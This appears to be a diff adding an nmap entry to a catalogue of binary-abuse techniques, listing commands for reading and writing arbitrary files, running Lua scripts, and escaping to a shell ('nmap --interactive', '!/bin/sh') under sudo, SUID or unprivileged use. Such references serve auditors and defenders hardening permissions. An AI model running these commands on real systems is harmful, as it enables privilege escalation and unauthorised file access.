@@ -1,0 +1,65 @@
+nmap
+====
+
+File read
+---------
+
+[Sudo]
+    nmap -iL /path/to/input-file
+    The file is actually parsed as a list of hosts/networks, lines are leaked through error messages.
+
+[SUID]
+    nmap -iL /path/to/input-file
+    The file is actually parsed as a list of hosts/networks, lines are leaked through error messages.
+
+[Unprivileged]
+    nmap -iL /path/to/input-file
+    The file is actually parsed as a list of hosts/networks, lines are leaked through error messages.
+
+File write
+----------
+
+[Sudo]
+    nmap -oG=/path/to/output-file DATA
+    The payload appears inside the regular nmap output.
+
+[SUID]
+    nmap -oG=/path/to/output-file DATA
+    The payload appears inside the regular nmap output.
+
+[Unprivileged]
+    nmap -oG=/path/to/output-file DATA
+    The payload appears inside the regular nmap output.
+
+Inherit
+-------
+
+[Sudo]
+    echo '...' >/path/to/temp-file
+nmap --script=/path/to/temp-file
+    This allows to run Lua code (`...`).
+
+[SUID]
+    echo '...' >/path/to/temp-file
+nmap --script=/path/to/temp-file
+    This allows to run Lua code (`...`).
+
+[Unprivileged]
+    echo '...' >/path/to/temp-file
+nmap --script=/path/to/temp-file
+    This allows to run Lua code (`...`).
+
+Shell
+-----
+
+[Sudo]
+    nmap --interactive
+!/bin/sh
+
+[SUID]
+    nmap --interactive
+!/bin/sh
+
+[Unprivileged]
+    nmap --interactive
+!/bin/sh
